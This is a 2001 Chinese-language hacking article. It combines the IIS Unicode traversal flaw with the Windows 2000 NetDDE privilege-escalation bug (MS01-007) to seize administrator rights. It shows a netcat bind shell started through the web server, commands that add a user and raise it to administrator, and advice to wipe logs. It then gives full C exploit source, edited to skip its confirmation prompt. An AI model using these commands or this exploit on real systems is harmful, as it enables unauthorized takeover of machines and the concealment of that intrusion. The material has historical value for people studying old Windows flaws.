---
title: "利用unicode和net dde漏洞夺取系统管理员权限"
date: 2001-03-03T00:00:00+08:00
tags: ["Security"]
draft: false
slug: "xfocus-article-120"
---

[quack](https://www.xfocus.net/bbs/index.php?lang=cn&act=Profile&do=03&MID=5) (quack_at_xfocus.org)

利用unicode和net dde漏洞夺取系统管理员权限


                    by coolweis 

                    coolweis@netguard.com.cn

                    北京华泰网安信息技术有限公司

--------------------------------------------------------------------------------

---------------------------

前言


本文的目的不是要教你去黑人家的机器，只是给大家一个思路。请不要做违反法律的事情。

任何利用本方法破坏别人机器等事情本人及本人所在的公司均不负责。


--------------------------------------------------------------------------------

-----------------------------


unicode漏洞可谓尽人皆知（偏偏许多系统管理员不知道，呵呵），但是unicode只能拿到gu

est权限，虽然还有其他办法获得管理员权限，但是比较复杂。

2001年2月5日，atstake.com上面公布了一个windows2000的net dde消息权限提升漏洞。利用

这个漏洞可以获得管理员权限，完全控制机器。下面是nsfocus.com上面的关于这个漏洞的详

细描述。


发布日期: 2001-2-7

 

更新日期: 2001-2-7 

受影响的系统:  

    Microsoft Windows 2000 Professional 

    Microsoft Windows 2000 Server 

    Microsoft Windows 2000 Advanced Server 

描述:

--------------------------------------------------------------------

 


网络动态数据交换（Network Dynamic Data Exchange)是一种在不同的Windows机器上的应用

程序之间动态共享数据的技术。这种共享是通过名为受信任共享（trusted shares）的通信

通道来完成的，受信任共享由网络DDE代理服务来管理。本地机器上的进程可以向网络DDE代

理发出请求，包括指定针对某个特定的受信任共享应该运行什么应用程序。但是由于网络DD

E代理运行在本地系统用户的安全上下文中并在此安全上下文中处理所有请求，因此攻击者就

有机会让网络DDE代理在本地系统用户的安全上下文中执行其指定的代码，从而提升权限并完

全控制本地机器。


细节描述如下：


Network DDE DSDM（DDE Share Database Manager）服务负责维护所有活动的网络DDE共享的

一个列表并管理NetDDE连接。当该服务启动时，在当前登录用户的桌面上将创建一个隐藏的

IPC窗口，用来与打开了DDE特性的应用程序进行通信。该窗口所处理的消息及其格式未在正

式文档中描述。


窗口的名字是“NetDDE Agent”，类名是“NDDEAgent”。由于窗口是由WINLOGON创建的，窗

口过程将运行在WINLOGON的进程空间中，它以SYSTEM的权限来处理消息。该窗口所处理的消

息之一是“WM_COPYDATA”消息，DDE用该消息将一块内存从一个进程传递给另一个进程。绝

大多数窗口间通信通常是由PostMessage( )来完成的，但WM_COPYDATA消息却是由SendMessa

ge( )函数来发

送的，并由底层的消息子系统（CSRSS）作为一种特殊情况进行处理。


通过该消息发送给隐藏窗口的结构具有如下格式：

4 字节 - E1 DD E1 DD  (魔数: 0xDDE1DDE1)

4 字节 - 01 00 00 00  (未知: 0x00000001)

4 字节 - 01 00 00 00  (未知: 0x00000001)

8 字节 - 05 00 00 09

         00 00 00 01  (DDE Share Mod Id)

4 bytes - CC CC CC CC  (未知: 未使用?)

ASCIIZ  - "SHARENAME$" (以NULL结尾的串: DDE受信任的共享名)

ASCIIZ  - "cmd.exe"    (以NULL结尾的串: DDE服务器启动命令)


当上述缓冲区传递给窗口过程时，它将首先检查3个魔数（即前12个字节）的值，如果与上述

的值不同，则消息处理过程将返回一个错误。否则就取出两个ASCIIZ串并将其转换成Unicod

e串，然后检查共享名以确保它存在并且是一个受信任的共享。


由于默认情况下在系统中存在几个受信任共享，因此可以对其进行穷举，对每个共享名都尝

试运行命令直到找到一个受信任的共享。“DDE Share Mod ID”将和上述结构中的对应的数

进行比较，如果相等则将在WINLOGON进程的上下文中执行上述第二个ASCIIZ串所指定的命令

，因此将创建一个继承了SYSTEM进程令牌的进程。“DDE Share Mod Id”本应是一个相对随

机的8字节数，但实际上却一直是个常数0x0100000009000005。


<* 来源：DilDog (dildog@atstake.com) 

         Microsoft Security Bulletin (MS01-007) 

*>


从上面的描述可以看出，我们可以利用这个漏洞进行提升权限。

根据atstake.com提供的程序，经过试验证实确实可以提升用户权限。假设我们编译的文件名

为ndde.exe。

我们在命令行下输入ndde.exe net user aaa /add，这样我们就建立了一个用户，用户名为

aaa，权限为user。密码为空。注意，如果在本地安全策略中指明密码策略的话，就要加上复

杂的密码，否则这是不能创建成功的。

接着可以用ndde.exe net localgroup administrators aaa /add将这个账号加入到管理员组

中。所有操作必须在本地计算机上登陆。不管你是用user用户登陆还是administrator登陆，

要注意的是net dde 和net dde dsdm两个服务要开放的。据atstake.com称这两个服务默认是

开放的，我没有检查是否为默认开放。据袁哥讲默认识不开的，我也不知道开不开了，懒得

再装一个机器试了，就当时开放得吧：）


下面我们看看如何利用这个漏洞和unicode漏洞结合获得管理员权限。


如何利用unicode漏洞已经讲的很多了，我就不讲了，下面直入主题――获得管理员权限。

在上传的文件中要包括nc.exe，ndde.exe。

首先用nc.exe在目标机器上开一个端口，假设为999端口。

[http://www.nothisdomain.com/scripts/nc.exe](http://www.nothisdomain.com/scripts/nc.exe) -l -p 999 -t -e c:\winnt\system32\cmd

.exe

然后再本机上nc [www.nothisdomain.com](http://www.nothisdomain.com/) 999

会出现这样的窗口：

C:\Inetpub\scripts>nc [www.nothisdomain.com](http://www.nothisdomain.com/) 999

Microsoft Windows 2000 [Version 5.00.2195]

(C) 版权所有 1985-1998 Microsoft Corp.


C:\Inetpub\scripts>


OK!我们进来了，现在的权限是guest！我们运行net user aaa /add

可以发现一下错误。

C:\Inetpub\scripts>net user aaa /add

net user aaa /add

系统发生 5 错误。


拒绝访问。


C:\Inetpub\scripts>

可见权限不够，好了，我们现在就要提升权限了。

首先建立一个aaa的账号。

C:\Inetpub\scripts>abc.exe net user aaa /add

abc.exe net user aaa /add


C:\Inetpub\scripts>

好像没什么反应，很快就运行完了，我们看看结果。

C:\Inetpub\scripts>net user

net user


\\WWW 的用户帐户


-------------------------------------------------------------------------------

aaa                      ad                       Administrator

Guest                    IUSR_KHB01               IWAM_KHB01

khb                      TsInternetUser

命令成功完成。


可以看到已经出现了aaa这个账号了！！

好了我们要成为管理员了！！


C:\Inetpub\scripts>abc.exe net localgroup administrators aaa /add

abc.exe net localgroup administrators aaa /add


C:\Inetpub\scripts>


我们来看看运行的结果：

C:\Inetpub\scripts>net localgroup administrators

net localgroup administrators

别名     administrators

注释     管理员对计算机/域有不受限制的完全访问权


成员


-------------------------------------------------------------------------------

aaa

ad

Administrator

命令成功完成。


我们可以看到aaa这个账号在管理员组了！！！


我们可以用将Iusr_machine的账号弄到管理员组中去，不过比较容易被发现，到底要怎么做

自己看着办吧。


我们有了管理员权限就可以为所欲为了！！！

赶快删你们删不掉的日志吧，呵呵：）


就写到这里吧，有什么问题可不要找我呀。

我饿了，还没吃饭呢，我要吃饭去了~~

886：）


哦，差点忘了，源程序自己编译去吧，没什么大问题，注意把下面一行注释掉。

 if(MessageBox(NULL,svPrompt,"Confirmation",MB_YESNO|MB_ICONQUESTION|MB_SETFOREG

ROUND)==IDNO)

不然会在控制台弹出窗口的，程序运行不下去的：）


源程序如下，我做了一点点的修改，可能你也要改：）


#include<windows.h>

#include<stdlib.h>

#include<stdio.h>

#include<nddeapi.h>


void NDDEError(UINT err)

{

    char error[256];

    NDdeGetErrorString(err,error,256);

    MessageBox(NULL,error,"NetDDE error",MB_OK|MB_ICONSTOP|MB_SETFOREGROUND);

 //   exit(err);

}


void *BuildNetDDEPacket(const char *svShareName, const char* svCmdLine, int *pBu

fLen)

{

    // Build NetDDE message

    int cmdlinelen=strlen(svCmdLine);

    int funkylen=0x18+strlen(svShareName)+1+cmdlinelen+1;

    char *funky=(char *)malloc(funkylen);

    if(funky==NULL) {

        MessageBox(NULL,"Out of memory.","Memory error.",MB_OK|MB_SETFOREGROUND|

MB_ICONSTOP);

        return NULL;

    }

    

    funky[0x00]=(char)0xE1;    

    funky[0x01]=(char)0xDD;

    funky[0x02]=(char)0xE1;

    funky[0x03]=(char)0xDD;    // 0xDDE1DDE1 (magic number)


    funky[0x04]=(char)0x01;

    funky[0x05]=(char)0x00;

    funky[0x06]=(char)0x00;

    funky[0x07]=(char)0x00; // 0x00000001 (?)


    funky[0x08]=(char)0x01;

    funky[0x09]=(char)0x00;

    funky[0x0A]=(char)0x00;

    funky[0x0B]=(char)0x00; // 0x00000001 (?)

    

    funky[0x0C]=(char)0x05; // ShareModId

    funky[0x0D]=(char)0x00;

    funky[0x0E]=(char)0x00;

    funky[0x0F]=(char)0x09;

    funky[0x10]=(char)0x00;

    funky[0x11]=(char)0x00;

    funky[0x12]=(char)0x00;

    funky[0x13]=(char)0x01;


    funky[0x14]=(char)0xCC;    // unused (?)

    funky[0x15]=(char)0xCC;

    funky[0x16]=(char)0xCC;

    funky[0x17]=(char)0xCC;


    memcpy(funky+0x18,svShareName,strlen(svShareName)+1);        // Share name

    memcpy(funky+0x18+strlen(svShareName)+1,svCmdLine,cmdlinelen+1);    // Comma

nd line to execute


    *pBufLen=funkylen;

    return funky;

}


int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance, LPSTR lpCmdLin

e,int nCmdShow)

{

     // TODO: Place code here.


 // Check command line

    int cmdlinelen;

    if(lpCmdLine==NULL || lpCmdLine[0]=='\0') {

        MessageBox(NULL,"Syntax is: netddmsg [-s sharename] <command line>","Com

mand line error.",MB_OK|MB_SETFOREGROUND|MB_ICONSTOP);

        return -1;

    }

    cmdlinelen=strlen(lpCmdLine);

    

    char *szShare=NULL;

    char *szCmdLine=lpCmdLine;

    if(strncmp(lpCmdLine,"-s",2)==0) {

        szShare=lpCmdLine+2;

        while ((*szShare)==' ')

            szShare++;

        char *szEnd=strchr(szShare,' ');

        if(szEnd==NULL) {

            MessageBox(NULL,"You must specify a command to run.","Command line e

rror.",MB_OK|MB_SETFOREGROUND|MB_ICONSTOP);

            return -1;

        }

        szCmdLine=szEnd+1;

        *szEnd='\0';

    }


    // Get NetDDE Window

    HWND hwnd=FindWindow("NDDEAgnt","NetDDE Agent");

    if(hwnd==NULL) {

        MessageBox(NULL,"Couldn't find NetDDE agent window","Error",MB_OK|MB_ICO

NSTOP|MB_SETFOREGROUND);

        return -1;

    }


    // Get computer name

    DWORD dwSize=256;

    char svCompName[256];

    GetComputerName(svCompName,&dwSize);


    // Get list of shares to try

    char *sharename,*sharenames;

    if(szShare==NULL) {

        // Try all shares

        UINT err;

        DWORD dwNumShares;

        // deep check otgpdvt

        err=NDdeShareEnum(svCompName,0,NULL,0,&dwNumShares,&dwSize);

        if(err!=NDDE_NO_ERROR && err!=NDDE_BUF_TOO_SMALL) {

            NDDEError(err);

        }

        sharenames=(char *)malloc(dwSize);

        err=NDdeShareEnum(svCompName,0,(LPBYTE)sharenames,dwSize,&dwNumShares,&d

wSize);

        if(err!=NDDE_NO_ERROR) {

            NDDEError(err);

        }

    } else {

        // Try command line share

        sharenames=(char *)malloc(strlen(szShare)+2);

        memset(sharenames,'0',strlen(szShare)+2);

        strcpy(sharenames,szShare);

    }

    

    // Try all shares

    for(sharename=sharenames;(*sharename)!='\0';sharename+=(strlen(sharename)+1)

) {

        

        // Ask user

        if(szShare==NULL) {

            char svPrompt[256];

            _snprintf(svPrompt,256,"Try command through the '%s'share?",sharenam

e);

     //       if(MessageBox(NULL,svPrompt,"Confirmation",MB_YESNO|MB_ICONQUESTIO

N|MB_SETFOREGROUND)==IDNO)

       //         continue;

        }


        // Get NetDDE packet

        void *funky;

        int funkylen;

        funky=BuildNetDDEPacket(sharename, szCmdLine, &funkylen);

        if(funky==NULL)

            return -1;

    

        // Perform CopyData

        COPYDATASTRUCT cds;

        cds.cbData=funkylen;

        cds.dwData=0;

        cds.lpData=(PVOID)funky;

        SendMessage(hwnd,WM_COPYDATA,(WPARAM)hwnd,(LPARAM)&cds);

    

        // Free memory

      free(funky);


    }


    // Free memory

    free(sharenames);


    return 0;

}


欢迎转载，请注明出处：）
